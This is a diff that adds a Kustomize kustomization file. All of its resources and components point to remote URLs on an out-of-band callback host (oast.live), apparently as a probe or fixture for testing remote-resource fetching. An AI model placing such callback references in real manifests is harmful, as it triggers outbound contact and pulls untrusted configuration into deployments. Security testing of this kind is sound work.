@@ -1,0 +1,7 @@
+apiVersion: kustomize.config.k8s.io/v1beta1
+kind: Kustomization
+resources:
+  - https://dbosdphokakf6knrq7l01g5jx5abc1yi6.oast.live/kremote-httpresource.yaml
+  - git::https://dbosdphokakf6knrq7l01g5jx5abc1yi6.oast.live/kremote-gitresource.git
+components:
+  - https://dbosdphokakf6knrq7l01g5jx5abc1yi6.oast.live/kremote-component.yaml
